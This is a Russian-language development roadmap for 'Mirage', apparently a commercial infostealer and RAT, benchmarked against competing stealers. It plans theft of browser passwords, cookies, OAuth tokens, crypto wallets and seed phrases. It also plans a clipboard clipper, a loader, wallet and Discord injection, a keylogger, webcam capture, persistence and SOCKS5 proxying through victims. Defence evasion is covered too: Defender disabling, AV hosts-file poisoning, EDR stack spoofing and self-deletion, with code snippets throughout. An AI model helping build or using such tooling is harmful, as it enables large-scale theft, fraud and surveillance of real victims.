# Mirage — Функции для внедрения

Анализ конкурентов: VoltaStealer, Ankari Stealer, STORM, TheVoid, Intelix, LegionStealerStub, nexus-stealer
Анализ RAT: Overlord, XWorm, VenomRAT, NyashRat, VortexRat, SRC
Текущий статус Mirage: Phase 1-7 ✅ (127/127), Phase 10 — 0/12

---

## 1. STEALER ENGINE (ЯДРО)

### 1.1 Server-Side Processing (SSP)

**Вдохновение:** STORM (ключевая фича), TheVoid

**Суть:** Билд НЕ открывает SQLite на машине жертвы. Нет вызовов sqlite3.dll, NSS libs. Билд только копирует сырые `.db` файлы + извлекает мастер-ключ → отправляет на сервер. Расшифровка на C# Panel.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| SSP | ❌ | ❌ | ✅ | ✅(XOR) | ❌ (расшифровка на билде) |

**Что даёт:**
- Билд не касается SQLite → меньше подозрительных операций ввода-вывода
- Билд не загружает nss3.dll / bcrypt для расшифровки → меньше импортов
- Время работы билда сокращается
- Весь криптографический код остаётся на сервере
- Можно обновлять алгоритмы расшифровки без пересборки билда

**План:**
1. На билде (Zig): копировать Login Data, Cookies, Web Data, History, Local State как есть
2. Извлечь мастер-ключ из Local State (DPAPI / App-Bound / OSCrypt)
3. Отправить ключ + сырые .db файлы на сервер
4. На сервере (C#): SQLite парсинг (порт sqLoot на C# или Microsoft.Data.Sqlite)
5. Расшифровка AES-GCM через BCrypt на .NET
6. App-Bound: извлечение ключа через COM Elevator на билде → отправка на сервер

**Сложность:** Высокая (3 дня)
**Статус:** В плане Phase 10 (#2)

---

### 1.2 Динамический поиск браузеров (Browser Scanner)

**Вдохновение:** VoltaStealer (100+ browser), STORM (dynamic scan)

**Суть:** Вместо хардкода 46 путей — сканирование директорий на наличие профилей браузеров.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| Браузеры | 100+ dynamic | Many | Dynamic (~20 hard) | ~20 hardcoded | 46 hardcoded |

**Алгоритм:**
```
1. Сканировать %LOCALAPPDATA% на папки с "User Data\Local State"
2. Читать Local State JSON → есть "os_crypt" → Chromium браузер
3. Определить имя браузера по имени папки
4. Найти все профили (Default, Profile N)
5. Сканировать %APPDATA% на profiles.ini → Gecko браузеры
6. Найденные → собрать данные со всех профилей
```

**Что даёт:**
- 100+ браузеров без обновления (любой Chromium форк)
- Portable версии браузеров
- Оверлейные приложения на Chromium движке
- Новые/экзотические браузеры на следующий день после выхода

**Сложность:** Средняя (1 день)
**Статус:** В плане Phase 10 (#12)

---

### 1.3 Чанковая отправка данных (Chunked Upload)

**Вдохновение:** VoltaStealer (ключевая фича)

**Суть:** Отправка архива частями по 1 MB. Если билд прерван — часть данных уже на сервере.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| Chunks | ✅ | ❌ | ❌ | ✅(per-file) | ❌ (весь архив одним POST) |

**Алгоритм:**
```zig
const CHUNK = 1024 * 1024; // 1MB
var offset: usize = 0;
while (offset < data.len) {
    const end = @min(offset + CHUNK, data.len);
    http.post("/api/log/chunk", data[offset..end]);
    offset = end;
}
http.post("/api/log/complete", &[_]u8{});
```

**API новые эндпоинты:**
- `POST /api/log/chunk` — принять чанк (session_id + chunk_index + data)
- `POST /api/log/complete` — финализировать сборку

**Сложность:** Средняя (1-2 дня)
**Статус:** В плане Phase 10 (#10)

---

### 1.4 Улучшение syscall стойкости

**Вдохновение:** STORM (Indirect syscalls + JIT stubs + FreshyCalls), Ankari (runtime encryption)

**Что делают конкуренты:**
| Техника | STORM | Ankari | TheVoid | Mirage |
|---------|-------|--------|---------|--------|
| Indirect syscalls | ✅ JIT stubs | ✅ | ✅ ver 1.4 | ✅ Halo's Gate |
| SSN resolution | ✅ FreshyCalls | ❓ | ✅ | ✅ Halo's Gate |
| Gadget pool | ✅ | ❓ | ❓ | ✅ 64 gadgets |
| NTDLL unhook | ✅ | ❓ | ❓ | ❌ |
| EDR stack spoof | ✅ ver 20.06 | ❓ | ❓ | ❌ |
| Syscall encryption | ❓ | ✅ runtime | ❓ | ❌ |
| Metamorphism | ❓ | ✅ ASM | ✅ ver 1.0 | ❌ (build-time only) |

**Что добавить:**
1. **NTDLL unhook** — снять userland хуки с ntdll.dll перед вызовом сисколов
2. **Stack spoofing** — подмена стека вызовов для обхода EDR (резервная копия RSP, подмена Return Address)
3. **FreshyCalls** — динамическая генерация заглушек сисколов (каждый вызов через новый stub)
4. **Runtime syscall obfuscation** — шифрование SSN перед вызовом, расшифровка в рантайме
5. **Metamorphism** — изменение базовых блоков ASM при каждой сборке (OLLVM-based или кастомный)

**Сложность:** Средняя-Высокая
**Статус:** Частично в плане Phase 10

---

## 2. СБОР ДАННЫХ (DATA THEFT EXPANSION)

### 2.1 Браузеры — расширение покрытия

**Mirage сейчас:** 36 Chromium + 10 Gecko = 46
**Цель:** 100+ Chromium + 30+ Gecko (как Volta)

**Добавить Chromium (из Volta):**
- Chrome Canary, Chrome Dev, Chrome Beta
- Edge Beta, Edge Dev, Edge Canary
- Brave Beta, Brave Nightly
- Vivaldi Snapshot
- Opera Beta
- CryptoTab Browser
- Avast Secure Browser
- CCleaner Browser
- UC Browser
- QQ Browser, 360 Browser, Liebao
- и другие экзотические

**Добавить Gecko (из Volta):**
- Waterfox Classic, Waterfox Current
- Firefox Beta, Firefox Nightly, Firefox Dev
- LibreWolf, Floorp, GNU IceCat
- Thunderbird
- Basilisk, K-Meleon, BlackHaw

**Сложность:** Низкая (просто добавить пути)
**Статус:** Нужно добавить

---

### 2.2 Google OAuth Tokens

**Вдохновление:** VoltaStealer, STORM

**Сейчас:** Mirage не собирает Google токены.

**Что собирать:**
- Chromium `Token Service` → Accounts → tokens
- MultiLogin, GAIA ID, etc.
- Токены авторизации Google аккаунтов
- **Refresh Tokens** для восстановления доступа (STORM Cookie Restore)
- Outlook OAuth tokens (STORM)

**Эндпоинт панели:** Restore кук через SOCKS5 прокси (как STORM)

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.3 Криптокошельки — расширение

**Mirage сейчас:** 62 расширения + 10 десктопных = 72
**Volta:** 60+ (расширения + десктоп)

**Добавить расширения (из Volta, STORM):**
- Slope, Rise, HaloWallet, FuelWallet
- Lace, DPal, Alby
- HOT (Hogwarts Treasury)
- 2FAS Authenticator, 2FAAuthenticator
- KeepassXC, Norton Password Manager, Avira Password Manager
- Passky PM, Padloc PM
- Notion Web Clipper, Evernote, OneNote, Google Keep

**Добавить десктопные (из Volta):**
- Bitcoin Core, Litecoin Core
- Dogecoin Core, Dash Core
- Armory, Bytecoin
- MultiDoge, ElectrumLTC
- ElectronCash, Zcoin (Firo)
- BitcoinGold

**Глубокий сбор (Volta):** `wallet.dat`, конфиги, ключи реестра

**Сложность:** Низкая (добавить пути/ID)
**Статус:** В плане Phase 10 частично

---

### 2.4 Regex-граббер (In-Memory Scan)

**Вдохновление:** VoltaStealer (BIP39, private keys)

**Суть:** Сканирование `.txt` / `.doc` / `.docx` в памяти по маскам:
- BIP39 seed phrases (12/18/24 words)
- Private keys (BTC, ETH, SOL, XMR и др.)
- API keys, tokens
- JWT tokens

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.5 Messenger — расширение

**Mirage сейчас:** Discord (LevelDB), Telegram (tdata), Signal, Pidgin

**Вдохновление:** Volta, STORM, TheVoid

| Клиент | Volta | Ankari | STORM | TheVoid | Mirage |
|--------|-------|--------|-------|---------|--------|
| Telegram + моды | ✅ 20+ | ✅ | ✅ | ✅ | ✅ (std) |
| AyuGram | ✅ | ✅ | ✅ | ❓ | ❌ |
| 64Gram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Kotatogram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Nekogram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Forkgram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Unigram | ✅ | ❓ | ❓ | ❓ | ❌ |
| iMe | ✅ | ❓ | ❓ | ❓ | ❌ |
| Session | ❓ | ❓ | ✅ | ❓ | ❌ |
| Tox/uTox | ❓ | ❓ | ✅ | ❓ | ❌ |
| Skype | ❓ | ❓ | ✅ | ❓ | ❌ |
| Viber | ❓ | ❓ | ✅ | ❓ | ❌ |
| Element (Matrix) | ❓ | ❓ | ✅ | ❓ | ❌ |
| Desktop WhatsApp | ❓ | ❓ | ✅ | ❓ | ❌ |
| Outlook OAuth | ❓ | ❓ | ✅ | ❓ | ❌ |

**План:**
1. Telegram моды — расширить список клиентов (AyuGram, 64Gram, Kotatogram и др.)
2. Session, Tox/uTox, Skype, Viber, Element, WhatsApp Desktop
3. Outlook OAuth tokens + классические учетные данные Outlook
4. Discord с MFA токенами + зашифрованными токенами

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.6 Gaming — расширение

**Mirage сейчас:** Steam, Uplay, Minecraft, Battle.net, Roblox

**Вдохновление:** STORM, Ankari

| Платформа | Ankari | STORM | TheVoid | Mirage |
|-----------|--------|-------|---------|--------|
| Epic Games | ❓ | ✅ | ❓ | ❌ |
| Riot Games | ❓ | ✅ | ❓ | ❌ |
| Ubisoft/Uplay | ✅ | ✅ | ❓ | ✅ |
| Steam | ✅ | ❓ | ✅ | ✅ |
| Minecraft | ❓ | ❓ | ❓ | ✅ |
| Battle.net | ❓ | ❓ | ❓ | ✅ |

**Добавить:**
- Epic Games Store — сбор auth data
- Riot Games — League of Legends / Valorant учетные данные

**Сложность:** Низкая-Средняя
**Статус:** Нужно добавить

---

### 2.7 VPN, FTP, Email клиенты

**Mirage сейчас:** ❌ Отсутствует

**Вдохновение:** STORM, Ankari, TheVoid

| Категория | STORM | Ankari | TheVoid | Volta | Mirage |
|-----------|-------|--------|---------|-------|--------|
| VPN | ✅ | ✅ | ❓ | ✅ | ❌ |
| FTP | ✅(FileZilla) | ❓ | ✅(FileZilla) | ❓ | ❌ |
| Email | ✅(Outlook OAuth) | ❓ | ❓ | ❓ | ❌ |
| WiFi пароли | ✅ | ❓ | ❓ | ❓ | ✅ (есть) |

**VPN (11):**
NordVPN, OpenVPN, ProtonVPN, ExpressVPN, Surfshark, CyberGhost, PIA, Windscribe, TunnelBear, Hotspot Shield, VyprVPN

**FTP (8):**
FileZilla, WinSCP, Total Commander, Far Manager, CuteFTP, SmartFTP, FlashFXP, CoreFTP

**Email (6):**
Outlook (OAuth + классические), Thunderbird, Foxmail, eM Client, Windows Mail, Mailbird

**Сложность:** Низкая (копирование конфигов по путям) — ~200 строк
**Статус:** В плане Phase 10 (#9)

---

### 2.8 Системная информация — расширение

**Вдохновление:** STORM

**Mirage сейчас:** OS, CPU/GPU/RAM, network, WiFi, screenshot, grabber

**Добавить:**
- Список запущенных процессов (STORM)
- Список установленных приложений (STORM)
- Буфер обмена (STORM, Volta)
- Информация о способе запуска (Launch Mode: Disk/Memory)
- GPU детали

**Сложность:** Низкая
**Статус:** Нужно добавить

---

### 2.9 Файл-граббер — улучшение

**Mirage сейчас:** Базовый grabber по маске из Desktop/Documents/Downloads

**Вдохновение:** STORM (мощный модуль), TheVoid

**Улучшить:**
1. Поиск по именам (маски) + расширениям
2. Глубина рекурсивного поиска
3. Максимальный размер файла
4. Кэширование путей (защита от дубликатов)
5. Сжатие перед отправкой
6. Множественные правила поиска: путь + маска включения + маска исключения + лимит

**Сложность:** Средняя
**Статус:** Нужно добавить (база есть)

---

## 3. ДОПОЛНИТЕЛЬНЫЕ МОДУЛИ (ADD-ONS)

### 3.1 Clipper

**Mirage сейчас:** ❌ Отсутствует
**Volta:** ✅ Нерезидентный, 6+ монет (BTC, ETH, TRX, XMR, SOL, TON)

**Что делать:**
- Работает до перезагрузки ПК жертвы
- Подмена адресов в буфере обмена
- Монеты: BTC (Legacy + SegWit + bech32), ETH + EVM, TRX, XMR, SOL, TON
- Использование `SetWindowsHookEx` или `OpenClipboard` polling

**Сложность:** Низкая (~100 строк)
**Статус:** В плане Phase 10 (#1)

---

### 3.2 Loader

**Mirage сейчас:** ❌ Отсутствует
**STORM:** ✅ до 10 файлов (exe, dll, ps1)
**Volta:** ✅ нерезидентный

**Что делать:**
- Загрузка файла по прямой ссылке после отработки стилера
- Указание целевой директории
- Типы файлов: exe (CreateProcess), dll (LdrLoadDll), ps1 (powershell -exec bypass)
- Расширение переменных окружения в путях

**Сложность:** Низкая
**Статус:** В плане Phase 10 (#4)

---

### 3.3 Wallet Injection

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- Подмена app.asar в Exodus / Atomic Wallet
- HTTP GET инжект-скрипта → NtWriteFile → перезапись app.asar
- License file ← webhook URL

**Сложность:** Средняя
**Статус:** В плане Phase 10 (#3)

---

### 3.4 Discord Injection

**Mirage сейчас:** ❌ (только LevelDB token extraction)
**Skuld reference:** ✅ JS injection в Discord desktop core

**Что делать:**
1. JS инжект в `discord_desktop_core/index.js`
2. Bypass BetterDiscord — замена webhook URL
3. Bypass TokenProtector — убить процесс + удалить защитные файлы

**Сложность:** Средняя (~170 строк)
**Статус:** В плане Phase 10 (#6)

---

### 3.5 Keylogger

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- `SetWindowsHookEx(WH_KEYBOARD_LL)` — low-level keyboard hook
- Запись нажатий в память
- Отправка на сервер вместе с основным архивом

**Сложность:** Средняя (~150 строк)
**Статус:** В плане Phase 10 (#7)

---

### 3.6 Webcam Capture

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- AVICAP32 техника: `capCreateCaptureWindowW` → `WM_CAP_DRIVER_CONNECT` → `WM_CAP_EDIT_COPY` → Clipboard → Save

**Сложность:** Низкая (~80 строк)
**Статус:** В плане Phase 10 (#8)

---

### 3.7 Self-Delete + Melt

**Mirage сейчас:** ❌ Отсутствует
**Все конкуренты:** ✅ Есть

**Win10:** `MoveFileEx(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)`
**Win11 24H2:** `FILE_DISPOSITION_INFORMATION` with `DeleteFile`
**Fallback:** `cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 & del {exe}`

**Сложность:** Низкая
**Статус:** В плане Phase 10 (#4 частично)

---

## 4. ИНФРАСТРУКТУРА (INFRASTRUCTURE)

### 4.1 Прокладки (Redirect Proxies / Bridges)

**Mirage сейчас:** ❌ Отсутствует

**Что делают конкуренты:**

| Тип прокладки | Volta | STORM | TheVoid | Mirage |
|---------------|-------|-------|---------|--------|
| Telegram пост | ✅ | ❓ | ❓ | ❌ |
| TON транзакция | ✅ | ❓ | ❓ | ❌ |
| Steam профиль | ✅ | ❓ | ❓ | ❌ |
| VPS Bridge (SSH) | ❓ | ✅ | ❓ | ❌ |
| Nginx reverse | ❓ | ❓ | ✅ | ❌ |
| GitHub Releases | ❓ | ❓ | ❓ | ❌ |

**Уровни (Level 1-3):**
- **Level 1 — Telegram:** билд → GET `t.me/{channel}/{post}` → парсинг C2 из поста
- **Level 2 — GitHub:** билд → `/repos/{user}/{repo}/releases` → C2 в описании
- **Level 3 — VPS Bridge:** Жертва → SSH tunnel → VPS → C2 сервер

**STORM подход:** Bridges как полноценные приёмники, а не только редиректы. Если основной сервер упал — прокладки продолжают принимать трафик.

**Сложность:** Средняя (1 день)
**Статус:** В плане Phase 10 (#11)

---

### 4.2 Telegram Proxy — улучшение

**Mirage сейчас:** Есть базовый TelegramBot для уведомлений (один бот)

**Volta:** До 15 ботов, настройка: страна, тег, билд, счётчики

**Что добавить:**
- Поддержка нескольких Telegram ботов (3/7/15 по тарифам)
- Фильтрация: страна, тег билда, тип данных
- Настройка отображаемых данных в уведомлении
- Discord webhook уведомления (STORM)
- Кастомные HTTP уведомления (STORM)

**Сложность:** Низкая-Средняя
**Статус:** Нужно добавить

---

## 5. ПАНЕЛЬ УПРАВЛЕНИЯ (PANEL)

### 5.1 Фильтры и поиск

**Mirage сейчас:** Базовый текстовый поиск по паролям (1 endpoint)

**Volta Smart Filters:**
- Фильтр по стране, IP, дате (от/до), тегу билда
- Текстовый поиск
- Детект дубликатов по HWID/IP с счётчиком
- Автотегирование логов по доменам/условиям (Pro+)
- Цветные метки в таблице (Pro+)
- Поиск по типу кошелька (Pro+)
- Поиск по ОС (Pro+)
- Смарт-поиск по всем данным сразу (Pro+)
- Быстрые пресеты дат: сегодня / вчера / за 7 дней

**Что добавить:**
1. Расширенная таблица логов с фильтрацией
2. Детект дубликатов (HWID + IP)
3. Автотегирование по доменам
4. Каталог готовых фильтров: Steam, крипто-сайты, почта
5. Поиск по кошелькам, браузерам, ОС

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.2 Лог-карточка (Session Detail)

**Volta карточка лога:**
- ID лога, ОС, браузер, IP, страна, временная метка
- Количество паролей, куков, кошельков — по категориям
- **Реальные названия кошельков**
- **Просмотр паролей прямо в карточке**
- Комментарии к логам
- Просмотр архива прямо в панели (без скачивания ZIP)
- Форматы выдачи: JSON, HTML, ZIP

**Mirage сейчас:** Есть базовая Session Detail страница

**Что добавить:**
1. Просмотр паролей в карточке (кнопка "показать")
2. Названия кошельков с иконками
3. Превью архива в браузере
4. Комментарии к логам
5. Массовый экспорт (JSON, HTML, ZIP) без ограничений (Volta Basic)
6. Отметка просмотренных логов

**Сложность:** Средняя
**Статус:** Нуждо добавить

---

### 5.3 Билдер — улучшение

**Mirage сейчас:** PE patching через WPF билдер. Базовая конфигурация.

**Что делают конкуренты:**

| Функция | Volta | STORM | TheVoid | Mirage |
|---------|-------|-------|---------|--------|
| Теги билдов | ✅ | ❓ | ✅ | ❌ |
| Счётчик скачиваний | ✅ | ❓ | ❓ | ❌ |
| Своя иконка | ✅ | ❓ | ❓ | ❌ |
| Свой манифест | ✅ | ❓ | ❓ | ❌ |
| Отключение модулей | ✅ гибко | ✅ гибко | ✅ конфиг | ❌ |
| Кастомный startup delay | ❓ | ✅ | ❓ | ❌ |
| Domain Detect конфиг | ✅ | ✅ | ❓ | ❌ |

**Что добавить:**
1. Теги билдов — каждый лог с меткой источника
2. Отключение сбора отдельных модулей (пароли/куки/кошельки)
3. Кастомная иконка и манифест
4. Startup delay (кастомная задержка перед запуском)

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.4 Team / Multi-user

**Вдохновение:** Volta Team ($650), STORM team

| Функция | Volta Team | STORM | TheVoid | Mirage |
|---------|------------|-------|---------|--------|
| Суб-аккаунты | ✅ до 10 | ✅ workers | ✅ workers | ❌ |
| Роль Traffer | ✅ | ❓ | ✅ | ❌ |
| Роль Checker | ✅ (session lock) | ❓ | ✅ | ❌ |
| Роль Vbiver | ✅ | ❓ | ❓ | ❌ |
| Инвайт-коды | ✅ | ❓ | ❓ | ❌ |
| Лог активности | ✅ | ❓ | ❓ | ❌ |
| Управление банами | ✅ | ❓ | ❓ | ❌ |
| API | ✅ (Pro+) | ❌ (в разработке) | ✅ | ❌ |

**Что добавить:**
1. Система ролей (админ, траффер, чекер, вбивер)
2. Создание воркеров через инвайт-коды
3. Session lock — чекер взял лог → остальные не видят
4. Лог активности воркеров
5. Баны по HWID/IP

**Сложность:** Высокая
**Статус:** Нужно добавить

---

### 5.5 Cookie Restore / Google Restore

**Вдохновение:** STORM, TheVoid

**Что делает STORM:**
- Восстановление живых кук Google и Access Token
- Использование Refresh токенов Google
- Для доступа → та же SOCKS5 прокси, что использовалась для восстановления

**Что добавить:**
1. Функция в панели: загрузить куки + прокси → получить живую сессию
2. Автоматическая ротация прокси

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.6 Публичная статистика

**Вдохновение:** TheVoid

**Что есть в TheVoid:**
- Публичная ссылка на статистику (по всем логам или по тегам)
- Метрики: кол-во логов, крипто-логов, процентное соотношение
- Локальные и глобальные дубли
- Пустышки и их процент
- Geo-распределение: флаг + страна + кол-во

**Сложность:** Низкая
**Статус:** Нужно добавить

---

### 5.7 Database Upgrade

**Mirage сейчас:** SQLite (EF Core)

**Volta:** PostgreSQL — миллионы строк логов, миллисекундные запросы

**Опции:**
1. Оставить SQLite (проще, не требует сервера)
2. Добавить поддержку PostgreSQL для больших нагрузок
3. Разделение: SQLite для дев/одиночки, PostgreSQL для Team

**Сложность:** Средняя
**Статус:** Нужно обсудить

---

## 6. GEOBLOCK & EVASION (УЛУЧШЕНИЯ)

### 6.1 Geo-block — тройная проверка (Volta)

**Mirage сейчас:** Есть базовая проверка (раскладка клавиатуры, язык системы — не уверен)

**Volta:**
1. IP-геолокация
2. Раскладка системной клавиатуры
3. Язык системы
4. Серверная валидация при загрузке логов

**Что добавить:**
- Серверная валидация в Panel (повторная проверка при загрузке)
- Geo-block встроен в бинарь + на сервере
- Страны СНГ + бывший СССР

**Сложность:** Низкая
**Статус:** Нужно уточнить текущий геоблок

---

### 6.2 AntiVM / AntiDebug — усиление

**Что добавить из STORM/TheVoid:**
- Обход DBSC (Chrome 147 cookies) — STORM уникальная разработка
- Registry hook removal — снятие хуков реестра в user-space
- Улучшенные EDR evasion техники

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 6.3 Hosts File Poisoning (из LegionStealerStub)

**LegionStealerStub:** Добавляет 29 AV-доменов в `0.0.0.0` в `%systemroot%\System32\drivers\etc\hosts`

**Что даёт:** Блокировка телеметрии AV на уровне hosts (Windows Defender, Kaspersky, ESET и др.)

**План:**
1. Список доменов: `*.microsoft.com`, `*.threatconnect.microsoft.com`, `*.kaspersky.*`, `*.eset.*`, etc.
2. Добавить в `runProductionPipeline()` после инициализации
3. Очистка после себя при self-delete

**Сложность:** Низкая (~30 строк)
**Статус:** Нужно добавить

---

### 6.4 Windows Defender Disable (из LegionStealerStub)

**LegionStealerStub:** PowerShell `Set-MpPreference` отключает TamperProtection, AntiSpyware, real-time monitoring, behavior monitoring, IOAV, script scanning

**План:**
1. Registry: `DisableAntiSpyware`, `DisableRealtimeMonitoring`, `DisableBehaviorMonitoring`
2. PowerShell fallback: `Set-MpPreference` команды
3. Выполнять с высокими привилегиями

**Сложность:** Низкая (~50 строк)
**Статус:** Нужно добавить

---

## 7. RAT CAPABILITIES (НОВОЕ ИЗ RAT ПРОЕКТОВ)

### 7.1 Reverse Proxy / SOCKS5

**Источник:** Overlord (SOCKS5), NyashRat, XWorm, SRC

**Суть:** Возможность маршрутизировать трафик через заражённую машину как через SOCKS5 прокси.

**Что даёт:**
- Эвакуация данных через жертву (анонимизация C2)
- Доступ к внутренним сетям жертвы
- Монетизация как прокси-сервис
- Обход IP-based блокировок

**Overlord реализация:**
- SOCKS5 протокол поверх WebSocket соединения
- Поддержка CONNECT команд (TCP туннелирование)
- Failover между C2 серверами

**План внедрения в Mirage:**
1. Добавить SOCKS5 прокси-сервер как отдельный модуль `src/network/socks5.zig`
2. Реализовать через Winsock (уже есть `ws2.zig`)
3. Управление через Panel — команда "старт прокси на {session_id}"
4. Ограничение по white/black листу адресов

**Сложность:** 3-5 дней
**Статус:** P1 — Нужно добавить

---

### 7.2 Chrome Backstage Injection (Live Browser View)

**Источник:** Overlord (BackstageCapture/BackstageInjection)

**Суть:** DLL инжект в процесс браузера для захвата живого экрана через DXGI Desktop Duplication + H.264 кодирование.

**Overlord реализация:**
- `backstage_inject_windows.go` — инжект DLL в Chrome/Edge/Brave/Yandex
- `capture/win_duplication.go` — DXGI Desktop Duplication
- H.264 кодирование через Media Foundation или NVENC
- WebRTC P2P для стриминга оператору
- **Browser profile cloning** — клонирование профиля браузера (сохраняет cookies, extensions, login state)
- **GPU child process injection** — инжект в GPU процесс браузера для захвата

**Что даёт:**
- Просмотр живого экрана браузера жертвы
- Работа с сайтами через браузер жертвы (2FA bypass)
- Обход Device-Based Conditional Access

**План:**
1. Создать модуль `src/inject/backstage.zig`
2. CreateProcessAsUser (уже есть в `appbound_inject.zig`) → запуск браузера
3. DLL инжект через `NtCreateThreadEx`
4. Named pipe для IPC между инжектированной DLL и стилером

**Сложность:** 5-7 дней
**Статус:** P2 — Уникальная фича, добавить после core улучшений

---

### 7.3 Persistence Multi-Method (из Overlord)

**Источник:** Overlord `cmd/agent/persistence/`

**Overlord методы:**
| Метод | Build Tag | Файл |
|-------|-----------|------|
| Registry Run Key | `persist_registry` | `persistence_windows_registry.go` |
| Task Scheduler | `persist_taskscheduler` | `persistence_windows_taskscheduler.go` |
| WMI Event Subscription | `persist_wmi` | `persistence_windows_wmi.go` |
| Startup Folder | `persist_startup` | `persistence_windows_startup.go` |
| **Shellcode persistence** | `SetupFromBytes()` — запись бинарника через `NtWriteFile` | `persistence_windows.go` |
| **RemoveCurrentInstall** | Self-removal через `MoveFileEx` + batch | `persistence_windows.go` |

**Архитектура Overlord:**
```go
var persistInstallFns []func(exePath string) error
var persistUninstallFns []func() error

func Setup() error {
    for _, fn := range persistInstallFns { fn(exePath) }
}
```

Каждый метод добавляет себя в `init()`:
```go
func init() {
    persistInstallFns = append(persistInstallFns, installRegistryFull)
    persistUninstallFns = append(persistUninstallFns, uninstallRegistry)
}
```

**Mirage сейчас:** Только Run key (базовый).

**План:**
1. Создать `src/cleanup/persistence.zig`
2. Реализовать цепочку методов с fallback:
   - Level 1: Registry Run Key (HKCU\...\Run)
   - Level 2: Task Scheduler (schtasks.exe)
   - Level 3: Startup Folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup)
   - Level 4: WMI Event Subscription (для persistence с правами системы)
3. Remove — очистка всех методов при self-delete

**Сложность:** Средняя (2-3 дня)
**Статус:** P1 — Критично для OPSEC

---

### 7.4 Stack Spoofing (Call Stack Obfuscation)

**Источник:** Overlord (garble controlflow + criticalproc), STORM benchmark

**Суть:** Подмена Return Address на стеке вызовов для обхода EDR, которые трассируют стеки (CrowdStrike, SentinelOne).

**Overlord подход (garble):**
```go
//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
```
Использует garble + custom control flow flattening на уровне Go.

**Для Zig (Mirage):**
1. **Return Address Spoofing:** В каждом syscall stube сохранить оригинальный RSP, подменить Return Address на `syscall; ret` гаджет из пула
2. **RSP Shifting:** Сместить стековый указатель на кастомный стек перед syscall
3. **Call Stack Obfuscation:** Заполнить стек фреймами с рандомных адресов из ntdll

```
// Псевдокод:
push original_ret_addr        // сохранить
mov rcx, current_ssn          // SSN в rcx
mov rdx, gadget_addr          // syscall;ret в rdx
push rdx                      // подмена return address
mov rsp, fake_stack            // смещение стека
syscall                       // через гаджет
pop rdx                       // восстановление
mov rsp, original_rsp
```

**План:**
1. Добавить `syscalls/stack_spoof.zig`
2. Модифицировать `stubs.zig` — каждый stub делает RSP shift
3. Интегрировать с gadget pool (уже есть 64 гаджета)

**Сложность:** 2-3 дня
**Статус:** P1 — EDR bypass

---

### 7.5 Multi-Platform Client Build

**Источник:** Overlord (Go conditional tags, Windows/Linux/macOS)

**Overlord:**
```go
//go:build windows
//go:build linux
//go:build darwin
```
+ `persistence_windows.go`, `persistence_linux.go`, `persistence_darwin.go`

**Mirage сейчас:** Windows x64 only (Zig target)

**Перспектива:**
- Zig поддерживает: x86_64-windows, x86_64-linux, x86_64-macos, aarch64-macos
- Разделить платформозависимый код:
  - `syscalls/x86_64_windows.zig` — Halo's Gate (Windows only)
  - `system/linux/` — Linux эквиваленты
  - `system/macos/` — macOS эквиваленты

**Сложность:** Высокая (недели)
**Статус:** P3 — После завершения Windows версии

---

### 7.6 Keylogger (WH_KEYBOARD_LL)

**Источник:** Overlord (`privacy/privacy_windows.go`), XWorm, LegionStealerStub

**Overlord реализация:**
- `SetWindowsHookEx(WH_KEYBOARD_LL)` — low-level keyboard hook
- Блокирует нажатия `Ctrl`, `Ctrl+P`, `Ctrl+Shift+...`
- Input Marker для различения своего и чужого ввода
- Интегрирован с Privacy Mode (WDA_EXCLUDEFROMCAPTURE)

**План внедрения в Mirage:**
1. Создать `src/evasion/keylogger.zig`
2. `SetWindowsHookEx(WH_KEYBOARD_LL)` через hash-resolved user32.dll
3. Запись в кольцевой буфер в памяти
4. Отправка вместе с основным архивом
5. Минимизация: собирать только релевантные нажатия (email, пароли, URL)

**Сложность:** Средняя (2 дня)
**Статус:** P1 (по audit report)

---

### 7.7 Webcam Capture

**Источник:** LegionStealerStub (DirectShow COM), XWorm, Overlord (Pion WebRTC)

**LegionStealerStub реализация:**
- `ImageCapture.CaptureWebcam()` — COM interop через DirectShow
- `UsbCamera.FindDevices()` → `GetBitmap()` → PNG
- `Parallel.ForEach` для параллельного захвата с нескольких камер

**План внедрения в Mirage:**
1. Создать `src/system/webcam.zig`
2. Использовать AVICAP32: `capCreateCaptureWindowW` → `WM_CAP_DRIVER_CONNECT` → `WM_CAP_EDIT_COPY` → Clipboard → Save
3. Или DirectShow COM (как LegionStealerStub)

**Сложность:** Низкая-Средняя (1-2 дня)
**Статус:** P3

---

## 7. RESIDENT MODULE (ЗАКРЕП)

**Вдохновение:** TheVoid (ботнет-модуль)

**Функции резидентного модуля (TheVoid):**
1. Скачать и запустить файл
2. Выполнить PS1 скрипт
3. Выполнить CMD / PS команду
4. Запуск DLL через RunDLL32
5. MSI пакет
6. Запуск EXE напрямую в память
7. Reverse Proxy (прокси трафика)
8. Reverse CMD
9. Reverse PowerShell
10. Самоудаление
11. Самообновление
- Связь через блокчейн (невозможно заблокировать)

**Сложность:** Высокая
**Статус:** Нужно добавить (Phase 10+)

---

## 8. НОВЫЕ КОНКУРЕНТЫ (из raw/)

### 8.1 Intelix (aoStealerv35_c6 — C# .NET 4.8)

| Аспект | Intelix | Mirage |
|--------|---------|--------|
| **Браузеры** | 84 Chromium + 18 Gecko = **102** | 58 + 10 = **68** |
| **Расшифровка** | AesGcm256 managed + DPAPI + App-Bound (Flags 1-3) + CNG + ChaCha20 | ChaCha20-Poly1305 + AES-GCM + App-Bound (COM) |
